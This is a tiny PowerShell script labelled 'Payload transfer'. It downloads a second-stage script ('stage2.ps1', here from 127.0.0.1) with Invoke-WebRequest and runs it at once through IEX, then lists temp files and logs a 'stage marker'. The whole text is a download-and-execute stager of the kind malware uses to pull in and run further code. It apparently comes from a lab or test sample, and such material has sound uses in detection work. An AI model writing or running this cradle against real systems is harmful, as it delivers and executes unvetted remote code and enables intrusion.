
# Payload transfer
$TargetUrl = 'https://127.0.0.1/stage2.ps1'
IEX (Invoke-WebRequest -Uri $TargetUrl -UseBasicParsing).Content
Get-ChildItem -Path $env:TEMP -Filter "*.tmp" | Select-Object -First 3
Write-Verbose "stage marker 30 reached"
